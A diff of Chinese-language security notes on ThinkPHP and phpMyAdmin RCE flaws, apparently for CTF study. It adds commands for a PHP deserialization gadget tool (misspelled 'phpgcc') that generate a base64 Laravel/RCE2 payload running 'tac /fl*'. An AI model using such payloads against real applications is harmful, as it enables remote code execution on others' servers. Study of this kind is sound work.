@@ -1,3 +1,6 @@
+
+
+
 **thinkphp rce漏洞**：比如5.0版本有个rce漏洞，该漏洞的漏洞关键点存在于thinkphp/library/think/Request.php文件中
 在docker中复现了多种版本的rce漏洞。
 
@@ -7,6 +10,20 @@ THINKPHP RCE漏洞的原理：举例有一个RCE是这样的：Dispatcher.class.
 ^
 phpMyadmin漏洞：
 <https://dummykitty.github.io/php/2020/11/22/phpmyadmin-%E5%90%8E%E5%8F%B0-getshell-%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86.html#cve-2013-3238>
+
+
+^
+## **php框架反序列化利用工具**
+```
+./ghpgcc -l
+列出
+
+./phpgcc -i Laravel/RCE2 
+
+./phpgcc -i Laravel/RCE2 system 'tac /fl*' |base64
+生成序列化串
+```
+
 
 
 ^
